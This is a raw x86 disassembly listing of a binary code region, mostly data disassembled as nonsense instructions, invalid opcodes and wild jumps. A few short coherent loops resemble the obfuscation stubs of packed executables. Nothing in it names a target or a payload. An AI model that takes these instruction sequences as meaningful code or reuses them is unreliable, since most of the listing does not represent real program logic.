  40f6e3:	sbb    eax,0xe05c9fd6
  40f6e8:	lods   al,BYTE PTR ds:[esi]
  40f6e9:	mov    ebx,0xb94f3bd3
  40f6ee:	cmp    DWORD PTR [ecx],edi
  40f6f0:	mov    bl,0x1f
  40f6f2:	fisub  WORD PTR [ebp-0x706a2647]
  40f6f8:	ds push ss
  40f6fa:	or     bh,ah
  40f6fc:	sub    BYTE PTR [ebx-0x61261ee4],dh
  40f702:	stos   DWORD PTR es:[edi],eax
  40f703:	(bad)
  40f706:	fild   DWORD PTR [ecx+0x44]
  40f709:	pop    es
  40f70a:	cld    
  40f70b:	dec    eax
  40f70c:	adc    ch,BYTE PTR ds:0x379ab023
  40f712:	daa    
  40f713:	scas   eax,DWORD PTR es:[edi]
  40f714:	stos   DWORD PTR es:[edi],eax
  40f715:	push   esp
  40f716:	mov    ah,0x7c
  40f718:	leave  
  40f719:	dec    ebx
  40f71a:	ret    
  40f71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f71c:	scas   eax,DWORD PTR es:[edi]
  40f71d:	data16 mov cl,0x29
  40f720:	repnz sub ecx,DWORD PTR [ecx+0x17]
  40f724:	push   ss
  40f725:	fisub  DWORD PTR [eax-0x41]
  40f728:	mov    edx,0xdefce974
  40f72d:	inc    edx
  40f72e:	sbb    BYTE PTR [ecx],ch
  40f730:	sbb    DWORD PTR [ebp+0x60],0xb2560c9b
  40f737:	jg     0x40f6dc
  40f739:	das    
  40f73a:	mov    esp,DWORD PTR [eax]
  40f73c:	clc    
  40f73d:	sbb    al,0x1e
  40f73f:	je     0x40f754
  40f741:	dec    eax
  40f742:	(bad)  
  40f744:	adc    eax,0xdc982420
  40f749:	repnz pop ds
  40f74b:	jg     0x40f7b2
  40f74d:	dec    edx
  40f74e:	leave  
  40f74f:	pop    ebx
  40f750:	bound  esi,QWORD PTR [ebx+0x1bb9ed79]
  40f756:	push   esp
  40f757:	lea    edx,[ebx+esi*2+0x19]
  40f75b:	pop    ss
  40f75c:	jecxz  0x40f77c
  40f75e:	xlat   BYTE PTR ds:[ebx]
  40f75f:	adc    eax,0x1e202e71
  40f764:	into   
  40f765:	out    0x63,eax
  40f767:	xchg   esp,eax
  40f768:	pop    esi
  40f769:	push   edx
  40f76a:	retf   0x13f
  40f76d:	std    
  40f76e:	jle    0x40f76a
  40f770:	retf   0x133b
  40f773:	adc    eax,0x254ed704
  40f778:	in     eax,0xdf
  40f77a:	(bad)  
  40f77b:	aad    0xd
  40f77d:	and    bh,0x56
  40f780:	ss pop edx
  40f782:	ins    DWORD PTR es:[edi],dx
  40f783:	mov    bl,0x89
  40f785:	arpl   WORD PTR [edi+0x28ec9172],bp
  40f78b:	mov    edi,0xb672f468
  40f790:	dec    ecx
  40f791:	pop    ebp
  40f792:	ds push ecx
  40f794:	or     ecx,ebx
  40f796:	(bad)  
  40f797:	(bad)  
  40f798:	and    eax,0x5fe0d225
  40f79d:	call   0xa2f9:0x3b1000a1
  40f7a4:	aaa    
  40f7a5:	lea    esi,[ecx]
  40f7a7:	cmp    eax,0xc711e06c
  40f7ac:	mov    ah,0x9c
  40f7ae:	xor    al,0xca
  40f7b0:	mov    eax,ds:0xaa246421
  40f7b5:	lea    esi,[bx+si]
  40f7b8:	stc    
  40f7b9:	out    0xa,al
  40f7bb:	mov    ch,BYTE PTR ds:0xfcb290b9
  40f7c1:	pop    edi
  40f7c2:	mov    al,ds:0x42a3843c
  40f7c7:	mov    cl,0x62
  40f7c9:	test   BYTE PTR [esi],al
  40f7cb:	ret    0xe711
  40f7ce:	sub    ecx,esi
  40f7d0:	cmp    ebx,DWORD PTR [ebp+0x6187ff3]
  40f7d6:	mov    ebx,0xf2f038b8
  40f7db:	and    al,0x5a
  40f7dd:	dec    esp
  40f7de:	fs push ebp
  40f7e0:	enter  0x5259,0x29
  40f7e4:	dec    esi
  40f7e5:	push   0xd1033244
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0xcbf7475f,ch
  40f80a:	shl    DWORD PTR [eax],1
  40f80c:	inc    edi
  40f80d:	js     0x40f887
  40f80f:	in     eax,0x7e
  40f811:	js     0x40f88b
  40f813:	nop
  40f814:	(bad)  [esi+ebp*8]
  40f817:	js     0x40f84d
  40f819:	sub    BYTE PTR [ecx-0xe7b15dd],cl
  40f81f:	and    BYTE PTR [ecx-0x598dd51b],al
  40f825:	jecxz  0x40f7f9
  40f827:	ror    edi,cl
  40f829:	xchg   BYTE PTR [edx-0x1fd96ef],al
  40f82f:	(bad)  
  40f830:	aas    
  40f831:	lods   eax,DWORD PTR ds:[esi]
  40f832:	push   cs
  40f833:	fidiv  DWORD PTR [ecx]
  40f835:	dec    ebp
  40f836:	jnp    0x40f80a
  40f838:	and    ah,BYTE PTR [esi]
  40f83a:	xor    al,0xc3
  40f83d:	cmp    eax,0x78f43053
  40f842:	xchg   edi,eax
  40f843:	shl    esi,cl
  40f845:	cmp    ebp,DWORD PTR [ebx]
  40f847:	popa   
  40f848:	test   eax,0x688d2d17
  40f84d:	mov    ch,0xd8
  40f84f:	imul   edi,ebp,0x697d08d7
  40f855:	(bad)  
  40f856:	out    0x1d,al
  40f858:	test   BYTE PTR [edi-0x1b97d2b6],0x4f
  40f85f:	cs addr16 pop esp
  40f862:	aad    0x11
  40f864:	les    edx,FWORD PTR [esi+0x2a740e5c]
  40f86a:	stos   BYTE PTR es:[edi],al
  40f86b:	mov    bh,BYTE PTR [eax-0x6f]
  40f86e:	adc    al,0x3
  40f870:	(bad)  
  40f872:	outs   dx,DWORD PTR ds:[esi]
  40f873:	jo     0x40f808
  40f875:	stos   BYTE PTR es:[edi],al
  40f876:	movzx  edi,BYTE PTR [edx]
  40f879:	inc    edi
  40f87a:	out    dx,eax
  40f87b:	fidivr WORD PTR [esi]
  40f87d:	mov    ebp,0xc8f154eb
  40f882:	xchg   ecx,eax
  40f883:	ins    DWORD PTR es:[edi],dx
  40f884:	mov    dl,0x88
  40f886:	push   cs
  40f887:	(bad)  
  40f888:	mov    DWORD PTR [esi-0x7e],esp
  40f88b:	pop    ebx
  40f88c:	shl    DWORD PTR [ecx+0x65],cl
  40f88f:	inc    edi
  40f890:	pop    esi
  40f891:	outs   dx,DWORD PTR ds:[esi]
  40f892:	cmp    bl,BYTE PTR [eax+0x7c]
  40f895:	lahf   
  40f896:	xchg   edx,eax
  40f897:	adc    ah,BYTE PTR [eax+eiz*8+0x68]
  40f89b:	mov    ecx,0xcba65ca3
  40f8a0:	jbe    0x40f8d2
  40f8a2:	jmp    0x40f8db
  40f8a4:	sbb    eax,0x8a41e3ae
  40f8a9:	addr16 xchg edx,eax
  40f8ab:	mov    bl,0x2c
  40f8ad:	sub    eax,0x30b09d92
  40f8b2:	or     cl,BYTE PTR [edx+0x70436f24]
  40f8b8:	jle    0x40f84b
  40f8ba:	loope  0x40f937
  40f8bc:	mov    ds:0x678d7d4c,eax
  40f8c1:	gs mov bh,dl
  40f8c4:	and    cl,ah
  40f8c6:	xchg   DWORD PTR [eax],ecx
  40f8c8:	add    DWORD PTR [ebp-0x3c],0x39
  40f8cc:	push   es
  40f8cd:	shr    DWORD PTR [edi-0x31],cl
  40f8d0:	sbb    DWORD PTR [edx-0x2c],0x9473dbae
  40f8d7:	aam    0x65
  40f8d9:	outs   dx,DWORD PTR ds:[esi]
  40f8da:	add    dh,bh
  40f8dc:	mov    BYTE PTR [ebp+0x7a],dh
  40f8df:	repz and esi,edx
  40f8e2:	or     eax,0xe52dac7d
  40f8e7:	mov    ebx,0xe8f94d41
  40f8ec:	mov    eax,0x4d233401
  40f8f1:	sahf   
  40f8f2:	and    esp,edx
  40f8f4:	mov    ebx,DWORD PTR [ecx+0x52d8efe1]
  40f8fa:	xlat   BYTE PTR ds:[ebx]
  40f8fb:	inc    eax
  40f8fc:	mov    ecx,0xfe36a47b
  40f901:	mov    dh,0x4d
  40f903:	and    ebp,DWORD PTR [ebx]
  40f905:	add    eax,DWORD PTR [ebp+edx*8-0x4e]
  40f909:	rol    BYTE PTR [edx+0x399c7d73],cl
  40f90f:	cs mov eax,0xfbdea8da
  40f915:	cld    
  40f916:	inc    esi
  40f917:	jmp    0x40f96c
  40f919:	popa   
  40f91a:	loop   0x40f948
  40f91c:	or     al,0x82
  40f91e:	xor    al,0x2
  40f920:	lock xchg edx,eax
  40f922:	add    eax,0xceb590fc
  40f927:	push   esp
  40f928:	aas    
  40f929:	leave  
  40f92a:	and    DWORD PTR [ebx+eax*8-0x20],ebp
  40f92e:	and    DWORD PTR [eax-0x3a],ebp
  40f931:	push   esi
  40f932:	push   es
  40f933:	mov    dh,0x8f
  40f935:	push   edx
  40f936:	jmp    0x40f90f
  40f938:	cmc    
  40f939:	push   eax
  40f93a:	inc    esi
  40f93b:	xchg   edi,eax
  40f93c:	jne    0x40f92a
  40f93e:	mov    ds:0xe4ffc17a,al
  40f943:	jge    0x40f96b
  40f945:	sub    eax,0x9917a841
  40f94a:	out    0x5d,al
  40f94c:	std    
  40f94d:	mov    ch,0x4
  40f94f:	(bad)  
  40f950:	push   ecx
  40f951:	mov    bh,al
  40f953:	lock xchg ebx,eax
  40f955:	adc    BYTE PTR [edx+0xc],cl
  40f958:	cdq    
  40f959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f95a:	cmp    DWORD PTR [edi+0x5b],0x7b
  40f95e:	and    eax,ebx
  40f960:	mov    ebp,0x91e89174
  40f965:	cmp    ebx,DWORD PTR [esi-0x298e0b3f]
  40f96b:	out    0x38,al
  40f96d:	rol    BYTE PTR [edx],cl
  40f96f:	aaa    
  40f970:	sbb    BYTE PTR [eax+0x64aae593],0x60
  40f977:	jl     0x40f9da
  40f979:	mov    cl,0xe1
  40f97b:	rol    BYTE PTR [edi+0x61],1
  40f97e:	stos   BYTE PTR es:[edi],al
  40f97f:	arpl   WORD PTR [esi+0x74],sp
  40f982:	cmp    BYTE PTR [eax],dl
  40f984:	sbb    al,bl
  40f986:	inc    ebp
  40f987:	retf   
  40f988:	or     BYTE PTR [edi-0x47],0xe1
  40f98c:	mov    dh,0xe5
  40f98e:	lahf   
  40f98f:	pop    ebx
  40f990:	popa   
  40f991:	inc    ecx
  40f992:	mov    dh,0xf4
  40f994:	aam    0xd0
  40f996:	jmp    0x96bbb69
  40f99b:	(bad)  
  40f99c:	fldcw  WORD PTR [edi]
  40f99e:	cmp    eax,0x44149eb9
  40f9a3:	xlat   BYTE PTR ds:[ebx]
  40f9a4:	xchg   esi,eax
  40f9a5:	fnstsw WORD PTR [ebp+0x5caa7f73]
  40f9ab:	and    ecx,ecx
  40f9ad:	and    DWORD PTR [eax],esi
  40f9af:	rcl    BYTE PTR gs:[edi+0x7b],1
  40f9b3:	outs   dx,BYTE PTR ds:[esi]
  40f9b4:	push   0x50c0e8fd
  40f9b9:	aad    0xea
  40f9bb:	mov    eax,ds:0xdba09b79
  40f9c0:	mov    ch,0xf4
  40f9c2:	pusha  
  40f9c3:	addr16 into 
  40f9c5:	pop    eax
  40f9c6:	(bad)  
  40f9c7:	in     eax,0x37
  40f9c9:	xchg   ebx,eax
  40f9ca:	mov    bh,0x1f
  40f9cc:	in     al,0x6b
  40f9ce:	in     al,0x81
  40f9d0:	cld    
  40f9d1:	cwde   
  40f9d2:	jnp    0x40f9dc
  40f9d4:	mov    ebp,edi
  40f9d6:	dec    edx
  40f9d7:	popf   
  40f9d8:	(bad)  
  40f9d9:	js     0x40f9a9
  40f9db:	add    edx,ebp
  40f9dd:	push   ecx
  40f9de:	and    BYTE PTR [eax],cl
  40f9e0:	add    edx,0x6cbc0c0c
  40f9e6:	sub    ax,0xa013
  40f9ea:	std    
  40f9eb:	sub    DWORD PTR [edx+0x2b],0x6dd8062b
  40f9f2:	push   eax
  40f9f3:	stc    
  40f9f4:	cdq    
  40f9f5:	sub    esi,eax
  40f9f7:	xor    BYTE PTR [ebp+0x2d],0xd5
  40f9fb:	(bad)  [esi-0x1d]
  40f9fe:	addr16 xchg edx,eax
  40fa00:	icebp  
  40fa01:	push   0x6e
  40fa03:	loop   0x40f9a2
  40fa05:	add    ebp,esi
  40fa07:	mov    BYTE PTR fs:[esi+0x2c041274],dh
  40fa0e:	mov    ch,0xe9
  40fa10:	jns    0x40f9d3
  40fa12:	adc    BYTE PTR [edx-0x52ade532],cl
  40fa18:	cld    
  40fa19:	lea    ebp,[edx+0x618f601c]
  40fa1f:	xchg   ebp,eax
  40fa20:	mov    WORD PTR [edi-0x7e],fs
  40fa23:	xchg   esi,eax
  40fa24:	push   ebx
  40fa25:	xchg   esp,eax
  40fa26:	and    dh,BYTE PTR [ecx-0x79]
  40fa29:	mov    dl,0xf9
  40fa2b:	lahf   
  40fa2c:	push   0x782c23cd
  40fa31:	nop
  40fa32:	inc    edi
  40fa33:	jmp    0x8faf:0x946e99c4
  40fa3a:	fidivr DWORD PTR [eax-0x6c]
  40fa3d:	int    0x43
  40fa3f:	jno    0x40fa11
  40fa41:	(bad)  
  40fa42:	and    eax,0x3bf1717a
  40fa47:	in     eax,0xae
  40fa49:	sub    DWORD PTR [esi-0x2d95bbdf],edx
  40fa4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa50:	or     BYTE PTR [eax+ebp*2+0x66b72ff7],bl
  40fa57:	lock jo 0x40fa24
  40fa5a:	test   DWORD PTR [esi+ecx*1+0x284a7316],edx
  40fa61:	in     eax,dx
  40fa62:	popa   
  40fa63:	mov    edi,0x6987b568
  40fa68:	xchg   DWORD PTR [ebx*4-0x645d7958],eax
  40fa6f:	int    0x12
  40fa71:	(bad)  
  40fa72:	ficomp WORD PTR [ebx+0x4cc6852e]
  40fa78:	sbb    al,0x78
  40fa7a:	add    esi,ecx
  40fa7c:	mov    ebx,0xab840fc2
  40fa81:	push   ebx
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb57
  40fb0f:	xchg   ebp,eax
  40fb10:	scas   eax,DWORD PTR es:[edi]
  40fb11:	inc    esi
  40fb12:	lea    eax,[ebp+0x78]
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40faf4
  40fb1b:	lods   eax,DWORD PTR ds:[esi]
  40fb1c:	and    BYTE PTR [ebp+0x2b],ch
  40fb1f:	sub    DWORD PTR [ecx+0x1ebeb648],esi
  40fb25:	fs jle 0x40fae5
  40fb28:	xchg   edx,eax
  40fb29:	aaa    
  40fb2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2b:	pop    ebp
  40fb2c:	shl    BYTE PTR [edx*8-0x40f93f9e],0x8e
  40fb34:	cli    
  40fb35:	inc    esi
  40fb36:	shl    BYTE PTR [ebx+0x7],cl
  40fb39:	mov    ds:0x161b0fdf,eax
  40fb3e:	aaa    
  40fb3f:	imul   BYTE PTR [eax]
  40fb41:	or     ah,BYTE PTR [eax]
  40fb43:	ins    DWORD PTR es:[edi],dx
  40fb44:	sbb    DWORD PTR [edx],ebx
  40fb46:	rol    DWORD PTR [eax],cl
  40fb48:	or     cl,BYTE PTR [eax-0x78]
  40fb4b:	shl    BYTE PTR [ebx+0x39],cl
  40fb4e:	mov    edx,0xe425e15a
  40fb53:	push   ebp
  40fb54:	dec    ebp
  40fb55:	mov    al,0x70
  40fb57:	sti    
  40fb58:	adc    DWORD PTR [ebp+0x1c9fd602],ebp
  40fb5e:	out    0x2f,al
  40fb60:	xlat   BYTE PTR ds:[ebx]
  40fb61:	jmp    0x40fb8a
  40fb63:	mov    bl,0x72
  40fb65:	mov    ah,0x6b
  40fb67:	xor    bh,BYTE PTR [eax+0x68]
  40fb6a:	mov    edi,0x349d646
  40fb6f:	sbb    eax,ecx
  40fb71:	lea    ebp,[edx+0x65]
  40fb74:	test   eax,0xeb41b0a9
  40fb79:	in     eax,0xa7
  40fb7b:	mov    bh,0xae
  40fb7d:	mov    ds:0x91160ec0,al
  40fb82:	scas   eax,DWORD PTR es:[edi]
  40fb83:	jle    0x40fb5d
  40fb85:	sar    BYTE PTR [edx],0xcc
  40fb88:	shl    al,cl
  40fb8a:	pop    cx
  40fb8c:	mov    ebx,edx
  40fb8e:	in     al,0xa7
  40fb90:	inc    esp
  40fb91:	adc    al,0x89
  40fb93:	jmp    0xaae7:0x5301016a
  40fb9a:	addr16 xchg bh,ch
  40fb9d:	mov    ch,BYTE PTR [ecx]
  40fb9f:	push   esi
  40fba0:	adc    DWORD PTR [edx+0x4101379d],esi
  40fba6:	lods   eax,DWORD PTR ds:[esi]
  40fba7:	xchg   edx,eax
  40fba8:	shl    BYTE PTR [esi+0x2b74bf96],0x0
  40fbaf:	xchg   ebp,eax
  40fbb0:	add    ah,BYTE PTR [ecx+ebx*8-0x7b]
  40fbb4:	hlt    
  40fbb5:	mov    ch,0x36
  40fbb7:	shl    BYTE PTR [esi-0x1c6a66e5],1
  40fbbd:	mov    esi,0x1e37e076
  40fbc2:	sub    ecx,DWORD PTR [edi+0x1c]
  40fbc5:	jp     0x40fb4f
  40fbc7:	push   esi
  40fbc8:	loopne 0x40fbe9
  40fbca:	cmp    ch,BYTE PTR [ebp-0x5c29e902]
  40fbd0:	cmp    DWORD PTR [edi-0x3f9e468b],edi
  40fbd6:	fxch   st(7)
  40fbd8:	in     eax,0x61
  40fbda:	pop    ss
  40fbdb:	lahf   
  40fbdc:	pushf  
  40fbdd:	out    dx,al
  40fbde:	sar    cl,1
  40fbe0:	mov    cl,0x1a
  40fbe2:	(bad)  
  40fbe3:	ret    
  40fbe4:	sub    bl,BYTE PTR [eax]
  40fbe6:	mov    bl,BYTE PTR [ebp+0xe255bbf]
  40fbec:	call   0xace9ccfb
  40fbf1:	dec    esp
  40fbf2:	mov    ebp,0xa0de7a07
  40fbf7:	inc    esi
  40fbf8:	imul   esi,DWORD PTR [esi-0x23],0xa6527b5e
  40fbff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc00:	xchg   edx,eax
  40fc01:	mov    cl,0x39
  40fc03:	mov    bh,0x41
  40fc05:	test   DWORD PTR [eax-0xd],esi
  40fc08:	adc    ebx,DWORD PTR [edi]
  40fc0a:	xor    al,0x4
  40fc0c:	pop    ecx
  40fc0d:	cmp    edi,DWORD PTR [eax]
  40fc0f:	icebp  
  40fc10:	push   ds
  40fc11:	sub    BYTE PTR [esi+0x49],ah
  40fc14:	rcr    esi,0x93
  40fc17:	je     0x40fc67
  40fc19:	or     dh,BYTE PTR [esi+0x1b]
  40fc1c:	cmp    DWORD PTR [esi],esp
  40fc1e:	loope  0x40fbfd
  40fc20:	xchg   edi,eax
  40fc21:	or     al,0x48
  40fc23:	outs   dx,DWORD PTR ds:[esi]
  40fc24:	or     al,0x8f
  40fc26:	mov    esi,0xb9de8540
  40fc2b:	xchg   dh,ah
  40fc2d:	cwde   
  40fc2e:	jb     0x40fc07
  40fc30:	hlt    
  40fc31:	xor    esp,ecx
  40fc33:	inc    ebp
  40fc34:	in     al,dx
  40fc35:	xchg   ebp,eax
  40fc36:	test   eax,0xce0f2c78
  40fc3b:	in     eax,0x24
  40fc3d:	and    al,0xa9
  40fc3f:	imul   eax,edx,0x7
  40fc42:	or     esi,ecx
  40fc44:	dec    esi
  40fc45:	in     al,0x9c
  40fc47:	jo     0x40fc1d
  40fc49:	pop    ss
  40fc4a:	mov    bh,0x23
  40fc4c:	test   eax,0x2184591e
  40fc51:	xchg   ebp,eax
  40fc52:	data16 xlat BYTE PTR ds:[ebx]
  40fc54:	clc    
  40fc55:	add    al,0x24
  40fc57:	inc    ebp
  40fc58:	aas    
  40fc59:	fcom   QWORD PTR [edi+0x38]
  40fc5c:	repz mov WORD PTR [edx],?
  40fc5f:	cmp    bh,BYTE PTR [ebp-0x66]
  40fc62:	mov    bh,0x92
  40fc64:	ds xor al,0x54
  40fc67:	sahf   
  40fc68:	and    al,0x35
  40fc6a:	(bad)  
  40fc6b:	push   esi
  40fc6c:	popf   
  40fc6d:	and    eax,0x3aff4da5
  40fc72:	xchg   edx,eax
  40fc73:	ds dec esp
  40fc75:	cs fldz 
  40fc78:	mov    ah,0xc8
  40fc7a:	(bad)
  40fc7d:	test   BYTE PTR [edx-0x25],al
  40fc80:	clc    
  40fc81:	out    0x55,eax
  40fc83:	xor    BYTE PTR fs:0x97083631,ch
  40fc8a:	push   es
  40fc8b:	repz adc edx,0xffffffcf
  40fc8f:	inc    eax
  40fc90:	lods   al,BYTE PTR ds:[esi]
  40fc91:	in     eax,dx
  40fc92:	int    0xa5
  40fc94:	jmp    0x40fcbf
  40fc96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc97:	in     al,dx
  40fc98:	pop    ebp
  40fc99:	push   0xbee4be13
  40fc9e:	repnz xchg esi,eax
  40fca0:	icebp  
  40fca1:	pop    edx
  40fca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca3:	arpl   WORD PTR [eax+0x4c],sp
  40fca6:	and    dh,dh
  40fca8:	or     al,0xe5
  40fcaa:	inc    ebx
  40fcab:	cwde   
  40fcac:	nop
  40fcad:	gs in  al,dx
  40fcaf:	xchg   ecx,eax
  40fcb0:	jb     0x40fd0d
  40fcb2:	popf   
  40fcb3:	scas   al,BYTE PTR es:[edi]
  40fcb4:	into   
  40fcb5:	add    ecx,DWORD PTR [ecx]
  40fcb7:	rcr    BYTE PTR [ebp+eax*2-0x7fa89493],cl
  40fcbe:	adc    al,ah
  40fcc0:	int3   
  40fcc1:	daa    
  40fcc2:	push   0xc
  40fcc4:	lods   al,BYTE PTR ds:[esi]
  40fcc5:	xor    DWORD PTR [edx+0x140f3c11],ecx
  40fccb:	pop    edi
  40fccc:	test   dl,0x90
  40fccf:	sub    cl,al
  40fcd1:	mov    cl,0x73
  40fcd3:	mov    DWORD PTR [edi+0x53],eax
  40fcd6:	push   eax
  40fcd7:	imul   ebx,DWORD PTR [ecx+0x3b40c40a],0xfffffff0
  40fcde:	lods   al,BYTE PTR ds:[esi]
  40fcdf:	loop   0x40fd4f
  40fce1:	imul   eax,DWORD PTR [edi-0x3],0x3672c67a
  40fce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce9:	(bad)  
  40fcea:	fstp   QWORD PTR gs:[ebx]
  40fced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcee:	jmp    0x7a0a:0x180ef31b
  40fcf5:	pop    ecx
  40fcf6:	(bad)  
  40fcf7:	pop    eax
  40fcf8:	icebp  
  40fcf9:	fidivr DWORD PTR fs:[edx]
  40fcfc:	push   ss
  40fcfd:	lds    esi,FWORD PTR [eax-0x440c03f]
  40fd03:	(bad)  [esi+0x4b3a8d4e]
  40fd09:	pusha  
  40fd0a:	mov    ah,0xc5
  40fd0c:	je     0x40fd06
  40fd0e:	cmp    eax,0xd95f8398
  40fd13:	sbb    ecx,0xcfe9a681
  40fd19:	shr    DWORD PTR ss:[edi-0x65],0x3e
  40fd1e:	pop    ebx
  40fd1f:	and    eax,0x2164c29f
  40fd24:	xor    BYTE PTR [edx],dh
  40fd26:	cwde   
  40fd27:	jg     0x40fd86
  40fd29:	xchg   ecx,eax
  40fd2a:	sbb    al,0xbe
  40fd2c:	add    ah,BYTE PTR [eax]
  40fd2e:	in     eax,0x4d
  40fd30:	or     edx,DWORD PTR [edx-0x32]
  40fd33:	mov    eax,db4
  40fd36:	in     eax,dx
  40fd37:	sbb    al,bh
  40fd39:	lods   eax,DWORD PTR ds:[esi]
  40fd3a:	test   eax,0xd918dfa6
  40fd3f:	jmp    0x40fd31
  40fd41:	sub    eax,0x56d241b8
  40fd46:	mov    dl,0x75
  40fd48:	or     dl,BYTE PTR [ecx+0x5b]
  40fd4b:	lods   al,BYTE PTR ds:[esi]
  40fd4c:	inc    bl
  40fd4e:	sbb    esi,esi
  40fd50:	push   es
  40fd51:	mov    ah,0x71
  40fd53:	arpl   WORD PTR [esi-0x14],dx
  40fd56:	inc    ebp
  40fd57:	dec    ebx
  40fd58:	pop    ebx
  40fd59:	mov    ah,0x89
  40fd5b:	dec    edx
  40fd5c:	stc    
  40fd5d:	rcl    DWORD PTR [esi+ecx*4-0x481aa613],1
  40fd64:	jg     0x40fdbe
  40fd66:	bound  edx,QWORD PTR [edx]
  40fd68:	or     bl,cl
  40fd6a:	xchg   ebx,eax
  40fd6b:	sbb    bl,dl
  40fd6d:	cs mov ah,0x5e
  40fd70:	mov    ah,al
  40fd72:	das    
  40fd73:	int    0x3e
  40fd75:	mov    WORD PTR [ecx-0x65c66813],ss
  40fd7b:	add    al,0x53
  40fd7d:	cmc    
  40fd7e:	cmp    ah,dh
  40fd80:	and    DWORD PTR [edx],eax
  40fd82:	or     DWORD PTR [edx],ebx
  40fd84:	inc    edx
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	dec    esp
  40fdbc:	inc    ebp
  40fdbd:	call   0x788c789e
  40fdc2:	js     0x40fda9
  40fdc4:	jle    0x40fe3e
  40fdc6:	js     0x40fe41
  40fdc8:	push   0xbd4c00db
  40fdcd:	push   eax
  40fdce:	dec    ebx
  40fdcf:	cmp    ch,BYTE PTR [ebx-0x2376dc7e]
  40fdd5:	(bad)  
  40fdd6:	jg     0x40fe1f
  40fdd8:	fs xor edx,edi
  40fddb:	fwait
  40fddc:	addr16 pop ecx
  40fdde:	mov    edx,edx
  40fde0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde1:	mov    BYTE PTR es:[edi],0x6c
  40fde5:	dec    edx
  40fde6:	sub    BYTE PTR [ebx],ah
  40fde8:	addr16 in al,0x75
  40fdeb:	mov    bl,BYTE PTR [ebx-0x51]
  40fdee:	xchg   BYTE PTR ds:0xa294faad,al
  40fdf4:	or     bh,bl
  40fdf6:	xchg   ecx,eax
  40fdf7:	dec    esi
  40fdf8:	int3   
  40fdf9:	fidiv  WORD PTR [esi]
  40fdfb:	lods   eax,DWORD PTR ds:[esi]
  40fdfc:	cwde   
  40fdfd:	ret    
  40fdfe:	adc    DWORD PTR [ecx],0xffffff9a
  40fe01:	(bad)  [edx]
  40fe03:	cmp    bl,BYTE PTR [esi]
  40fe05:	cwde   
  40fe06:	daa    
  40fe07:	inc    ecx
  40fe08:	dec    eax
  40fe09:	fnsave [eax+0x31]
  40fe0c:	mov    al,ds:0x8d51d84f
  40fe11:	sar    bl,cl
  40fe13:	push   edi
  40fe14:	pop    ss
  40fe15:	and    eax,0xfba47d43
  40fe1a:	cmp    al,0xbd
  40fe1c:	or     cl,ah
  40fe1e:	ja     0x40fda9
  40fe20:	dec    ecx
  40fe21:	inc    esp
  40fe22:	pop    ebx
  40fe23:	out    0x13,eax
  40fe25:	adc    bl,dl
  40fe27:	sub    bl,BYTE PTR [esi+0x5fac7293]
  40fe2d:	stos   BYTE PTR es:[edi],al
  40fe2e:	sbb    DWORD PTR [ebp-0x3ebd3069],esi
  40fe34:	sahf   
  40fe35:	pop    ss
  40fe36:	js     0x40fea3
  40fe38:	lahf   
  40fe39:	popa   
  40fe3a:	inc    ecx
  40fe3b:	add    DWORD PTR [ecx+ebx*8],ecx
  40fe3e:	mov    ebp,edi
  40fe40:	sub    eax,0x799f71c0
  40fe45:	add    ch,BYTE PTR [edi+0x4db059db]
  40fe4b:	xor    eax,0xc6aadf27
  40fe50:	mov    ah,0xb3
  40fe52:	fs xchg ecx,eax
  40fe54:	scas   eax,DWORD PTR es:[edi]
  40fe55:	aam    0xb9
  40fe57:	jne    0x40fdfe
